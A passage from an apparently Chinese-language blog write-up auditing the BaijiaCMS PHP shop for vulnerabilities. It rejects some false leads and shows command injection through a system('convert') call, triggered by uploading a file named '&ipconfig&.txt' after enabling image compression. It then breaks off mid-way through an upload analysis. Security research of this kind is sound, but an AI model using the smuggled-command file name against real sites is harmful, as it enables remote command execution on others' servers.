string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'dingtalk'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";\n  &#125;\n&#125;);\n&#125; <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看出是js类代码，简单分析一下这个函数，不难发现参数第一个是取对应的URL，第二个函数，也就是<code>function(data)</code>,它是对从第一个URL中提取出的参数进行执行，这里我们接着看函数，它这里当执行过函数后，对结果的状态取值进行了判断，结果为<code>1</code>时判断为登录成功，就会跳转至另一个界面，而当为<code>-1</code>时就会登录失败，重回登录界面，所以我们这里可以看到他其实是不存在输出执行结果的地方的，所以我们根本无从下手，这里是无法实现命令执行的，所以Pass。</p>\n<p>类似的文件还有如下几个，亦不必再看</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">文件路由：baijiacms-master\\system\\shopwap\\template\\mobile\\login_weixin_pc.php\n部分代码：\nfunction checkstatus()&#123;\n$.get(\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'weixin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'fastlogin_pc'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'dologincheck'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'skey'</span><span class=\"token operator\">=></span><span class=\"token variable\">$showkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\", &#123;&#125;, function(data)&#123;\nvar data= eval(\"(\" + data + \")\");\n\n  if(data.status==1)\n  &#123;\n location.href=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'weixin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'fastlogin_pc'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'tologin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'skey'</span><span class=\"token operator\">=></span><span class=\"token variable\">$showkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";\n  &#125;\n  if(data.status==-1)\n  &#123;\n  alert(\"登录失败！重新刷新二维码登录\");\t\n  location.href=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'shopwap'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'weixin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";\n  &#125;\n&#125;);\n&#125; \nsetInterval(\"checkstatus()\",2000);\n\n文件路由：baijiacms-master\\system\\weixin\\template\\mobile\\badding_weixin_pc.php\n部分代码：\nfunction checkstatus()&#123;\n$.get(\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'weixin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'banding_pc'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'dologincheck'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'skey'</span><span class=\"token operator\">=></span><span class=\"token variable\">$showkey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\", &#123;&#125;, function(data)&#123;\nvar data= eval(\"(\" + data + \")\");\n\n  if(data.status==1)\n  &#123;\n location.href=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'shopwap'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'account'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";\n  &#125;\n  if(data.status==-1)\n  &#123;\n  alert(\"登录失败！重新刷新二维码登录\");\t\n  location.href=\"<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">create_url</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mobile'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'act'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'weixin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'do'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'fastlogin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'bizstate'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'banding_weixin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>\";\n  &#125;\n&#125;);\n&#125; \nsetInterval(\"checkstatus()\",2000);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h4 id=\"疑点二-1\"><a href=\"#疑点二-1\" class=\"headerlink\" title=\"疑点二\"></a>疑点二</h4><p>接下来我们关注<code>system</code>函数，直接<code>Vscode</code>全局搜<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533375.png\" alt=\"在这里插入图片描述\"><br>最终在<code>includes\\baijiacms\\common.inc.php</code>下找到<code>system</code>函数，其中部分代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">file_save</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_tmp_name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$extention</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file_full_path</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$allownet</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t\n\t<span class=\"token variable\">$settings</span><span class=\"token operator\">=</span><span class=\"token function\">globaSystemSetting</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_move</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_tmp_name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_full_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'保存上传文件失败'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image_compress_openscale'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\n\t\t\t<span class=\"token variable\">$scal</span><span class=\"token operator\">=</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image_compress_scale'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token variable\">$quality_command</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$scal</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token variable\">$quality_command</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">' -quality '</span><span class=\"token operator\">.</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$scal</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'convert'</span><span class=\"token operator\">.</span><span class=\"token variable\">$quality_command</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_full_path</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_full_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token operator\">...</span>\n\t\t<span class=\"token operator\">...</span><span class=\"token operator\">.</span>\n\t\t<span class=\"token operator\">...</span><span class=\"token operator\">.</span><span class=\"token operator\">.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里可以看到是保存文件的，在其中进行了一个判断是否上传成功的，这个自不必在意，这里我们看另一个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$settings</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image_compress_openscale'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个是什么意思呢，我们这里可以看出如果这个判断可以通过，而后就会对文件名和文件路径进行一个<code>system</code>执行，那我们就有可能实现命令执行，因此我们的首要任务就是找到这个是什么东西，所以接下来全局搜索<code>image_compress_openscale</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533508.png\" alt=\"在这里插入图片描述\"><br>此时就找到了，它就是<code>图片压缩功能</code>，所以我们直接去开启这个功能，这里这个if判断就可以通过啦，所以接下来首先去开启这个，访问路由如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=manager&amp;do=netattach&amp;beid=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533529.png\" alt=\"在这里插入图片描述\"><br>接下来我们跟进看一下哪个文件利用了这个函数，毕竟找到文件才能利用。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533653.png\" alt=\"在这里插入图片描述\"><br>可以发现这里的话对此函数进行了一个利用，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$extention</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$extention</span><span class=\"token operator\">=</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extention</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extention</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'txt'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token variable\">$substr</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'PHP_SELF'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n               <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$substr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n               <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$substr</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">;</span>    \n               <span class=\"token punctuation\">&#125;</span>\n           <span class=\"token variable\">$verify_root</span><span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$substr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//file_save($file['tmp_name'],$file['name'],$extention,$verify_root.$file['name'],$verify_root.$file['name'],false);</span>\n                <span class=\"token function\">file_save</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$extention</span><span class=\"token punctuation\">,</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$verify_root</span><span class=\"token operator\">!=</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token constant\">WEB_ROOT</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$verify_root</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n\n         <span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'weixin_hasverify'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话是对上传文件进行了<code>pathinfo</code>函数处理，其实也就是获取了拓展名（后缀名），当为<code>txt</code>后缀时，会继续往下进行，继而调用这个<code>file_save</code>函数，所以我们这里的思路就明了了，我们这里新建一个文件，命名为<code>xxx命令.txt</code>，此时按理说就可以达到一个命令执行的效果，接下来进行尝试。</p>\n<p>我们这里新建一个txt文件，命名为<code>&amp;ipconfig&amp;.txt</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533942.png\" alt=\"在这里插入图片描述\"><br>接下来对其进行上传，具体路由</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/baijiacms-master/index.php?mod=site&amp;act=weixin&amp;do=setting&amp;beid=1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来保存便可以看到效果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533027.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h3><h4 id=\"疑点一（失败）-2\"><a href=\"#疑点一（失败）-2\" class=\"headerlink\" title=\"疑点一（失败）\"></a>疑点一（失败）</h4><p>文件路由<code>/system/eshop/core/mobile/shop/util.php</code>，重要代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$operation</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'areas'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">require_once</span> <span class=\"token constant\">WEB_ROOT</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/includes/lib/json/xml2json.php'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$file</span>    <span class=\"token operator\">=</span> <span class=\"token constant\">ESHOP_AREA_XMLFILE</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$json</span>    <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">xml2json</span><span class=\"token operator\">::</span><span class=\"token function\">transformXmlStringToJson</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$areas</span>   <span class=\"token operator\">=</span> <span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$json</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$areas</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>其他暂且不看，我们这里先看这两个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$file</span>    <span class=\"token operator\">=</span> <span class=\"token constant\">ESHOP_AREA_XMLFILE</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>本来直接包含<code>$file</code>的话，确实是可能存在文件读取，但我们这里可以看到它这里是给<code>$file</code>直接赋值了，这个是什么呢，我们全局搜索一下可以发现是一个<code>xml</code>文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533057.png\" alt=\"在这里插入图片描述\"><br>那么它对我们来说是不可控的，所以这里就不存在文件读取了，因此这里属于误报，看下一处。</p>\n<p>所以类似这种的可疑点不必再关注，这里简单列出几个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">文件名：<span class=\"token operator\">/</span>system<span class=\"token operator\">/</span>eshop<span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>web<span class=\"token operator\">/</span>sale<span class=\"token operator\">/</span>enough<span class=\"token operator\">.</span>php\n部分代码：\n<span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n文件名：<span class=\"token operator\">/</span>system<span class=\"token operator\">/</span>eshop<span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>web<span class=\"token operator\">/</span>shop<span class=\"token operator\">/</span>dispatch<span class=\"token operator\">.</span>php\n部分代码：\n<span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><h4 id=\"疑点一-1\"><a href=\"#疑点一-1\" class=\"headerlink\" title=\"疑点一\"></a>疑点一</h4><p>文件上传，这里Seay并未扫到什么，所以我们手动来进行寻找，对于文件上传，最先想到的就是上传二字，对应英文为<code>upload</code>，所以直接<code>Vscode</code>全局搜索<code>upload()</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533180.png\" alt=\"在这里插入图片描述\">文件路由为<code>includes\\baijiacms\\common.inc.php</code>，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">file_upload</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$type</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'没有上传内容'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token variable\">$limit</span><span class=\"token operator\">=</span><span class=\"token number\">5000</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$extention</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$extention</span><span class=\"token operator\">=</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extention</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$extentions</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'jpeg'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token 